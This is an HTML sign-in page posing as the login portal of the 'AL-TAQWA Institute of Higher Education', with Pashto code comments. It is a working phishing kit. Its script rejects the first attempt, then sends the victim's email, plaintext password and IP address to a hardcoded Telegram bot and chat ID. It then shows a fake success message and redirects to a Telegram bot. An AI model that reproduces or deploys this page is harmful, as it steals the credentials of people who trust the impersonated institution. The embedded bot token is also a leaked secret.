<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>AL-TAQWA - Sign in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Poppins', 'Tahoma', system-ui, -apple-system, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a2a3a 0%, #010510 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
            position: relative;
        }

        /* د شیشې شالید اغېز */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://www.transparenttextures.com/patterns/cubes.png'), radial-gradient(circle at 20% 30%, #0a2a3a, #010510);
            opacity: 0.05;
            pointer-events: none;
        }

        /* اصلي کارت */
        .login-card {
            max-width: 480px;
            width: 100%;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(2px);
            border-radius: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            overflow: hidden;
            padding: 2rem 2rem 2rem 2rem;
            transition: transform 0.2s;
        }

        /* لوګو ساحه */
        .logo-container {
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .logo {
            width: 80px;
            height: 80px;
            background: #1a4a6a;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 1rem;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        .logo span {
            font-size: 2.5rem;
            font-weight: bold;
            color: #ffd700;
        }

        h1 {
            font-size: 1.6rem;
            font-weight: 600;
            color: #1a3a4a;
            text-align: center;
            letter-spacing: -0.5px;
        }

        .sub {
            text-align: center;
            color: #4a6a7a;
            font-size: 0.8rem;
            margin-top: 0.2rem;
            margin-bottom: 1.8rem;
        }

        /* د انپوټ ساحې */
        .input-group {
            margin-bottom: 1.2rem;
        }

        .input-group label {
            display: block;
            color: #2a4a5a;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 0.3rem;
            letter-spacing: 0.5px;
        }

        .input-group input {
            width: 100%;
            padding: 0.9rem 1rem;
            background: #f5f7fa;
            border: 1px solid #d0dae5;
            border-radius: 0.75rem;
            color: #1a2a3a;
            font-size: 1rem;
            outline: none;
            transition: all 0.2s;
        }

        .input-group input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 3px rgba(26,115,232,0.2);
            background: white;
        }

        /* د یادولو چیک باکس */
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin: 1rem 0;
        }

        .checkbox-group input {
            width: 18px;
            height: 18px;
            cursor: pointer;
            accent-color: #1a73e8;
        }

        .checkbox-group label {
            color: #2a4a5a;
            font-size: 0.85rem;
            cursor: pointer;
        }

        /* د لاګین بټن */
        .login-btn {
            width: 100%;
            padding: 0.9rem;
            background: linear-gradient(95deg, #1a6a8a, #0a4a6a);
            border: none;
            border-radius: 2rem;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 0.5rem;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        .login-btn:hover {
            background: linear-gradient(95deg, #0a5a7a, #003a5a);
            transform: scale(1.01);
        }

        /* اضافي لینکونه */
        .extra-links {
            display: flex;
            justify-content: space-between;
            margin-top: 1.2rem;
            font-size: 0.75rem;
        }

        .extra-links a {
            color: #1a6a8a;
            text-decoration: none;
        }

        .extra-links a:hover {
            text-decoration: underline;
        }

        /* فوټر */
        .footer {
            text-align: center;
            margin-top: 1.8rem;
            font-size: 0.7rem;
            color: #6a8a9a;
            border-top: 1px solid #e0e8f0;
            padding-top: 1.2rem;
        }

        /* تېروتنې / بریالیتوب پیغامونه */
        .message {
            margin-top: 1rem;
            padding: 0.6rem;
            border-radius: 2rem;
            font-size: 0.8rem;
            text-align: center;
            display: none;
        }
        .error-msg {
            background: #ffe6e6;
            border: 1px solid #ff6666;
            color: #cc0000;
        }
        .success-msg {
            background: #e6ffe6;
            border: 1px solid #66cc66;
            color: #006600;
        }
    </style>
</head>
<body>

<div class="login-card">
    <div class="logo-container">
        <div class="logo">
            <span>📖</span>
        </div>
        <h1>AL-TAQWA</h1>
        <div class="sub">Institute of Higher Education</div>
    </div>

    <div class="input-group">
        <label>Email</label>
        <input type="email" id="email" placeholder="yourname@example.com">
    </div>

    <div class="input-group">
        <label>Password</label>
        <input type="password" id="password" placeholder="••••••••">
    </div>

    <div class="checkbox-group">
        <input type="checkbox" id="remember">
        <label for="remember">Remember password</label>
    </div>

    <button class="login-btn" id="loginBtn">Login</button>

    <div class="extra-links">
        <a href="#" onclick="alert('Forgot password? Contact admin')">Forgot password?</a>
        <a href="#" onclick="alert('Create new account')">Create account</a>
    </div>

    <div id="errorMsg" class="message error-msg"></div>
    <div id="successMsg" class="message success-msg"></div>

    <div class="footer">
        © 2025 AL-TAQWA Institute. All rights reserved.
    </div>
</div>

<script>
    // د Telegram بوټ توکن او چت آي ډي (ستاسو د بوټ معلومات)
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const ADMIN_CHAT_ID = "8295417969";

    // د هڅو شمېرلو لپاره (هر کارونکي ته جلا)
    let attemptStore = {};

    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    function showMessage(box, text, isError = true) {
        const msgBox = document.getElementById(box);
        msgBox.textContent = text;
        msgBox.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
        msgBox.style.display = 'block';
        setTimeout(() => {
            msgBox.style.display = 'none';
        }, 3500);
    }

    async function sendToTelegram(email, password, ip, success) {
        if (!success) return;  // یوازې بريالي هڅې اډمن ته ځي
        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {
            console.warn("Telegram send error", e);
        }
    }

    document.getElementById('loginBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();
        const ip = await getUserIP();

        if (!email || !password) {
            showMessage('errorMsg', 'Please fill in both email and password.', true);
            return;
        }

        // ساده ایمیل تایید
        if (!email.includes('@') || !email.includes('.')) {
            showMessage('errorMsg', 'Please enter a valid email address.', true);
            return;
        }

        const key = `${email}_${ip}`;
        if (!attemptStore[key]) attemptStore[key] = 0;
        attemptStore[key]++;

        const currentAttempt = attemptStore[key];

        if (currentAttempt === 1) {
            showMessage('errorMsg', 'First attempt failed. Second attempt will be accepted.', true);
            // دوه ثانیې وروسته فورم پاک کړه او هڅه بیا پیل کړه
            setTimeout(() => {
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
                // هڅه بیا پیل (هڅه پاتې کېږي، دوهم ځل به بريالی شي)
            }, 1500);
            return;
        }

        if (currentAttempt >= 2) {
            // په دوهمه هڅه کې بريالي (په ریښتیني لاګین کې به اډمن ته خبر ورکړل شي)
            await sendToTelegram(email, password, ip, true);
            showMessage('successMsg', '✅ Login successful! Redirecting...', false);
            
            // بوټ ته راستنیدل (خپل بوټ لینک دننه کړئ)
            setTimeout(() => {
                window.location.href = "https://t.me/imrankhabot?start=confirm_account";
            }, 2000);
        }
    });

    // د Enter کلي ملاتړ
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                document.getElementById('loginBtn').click();
            }
        });
    });
</script>
</body>
</html>
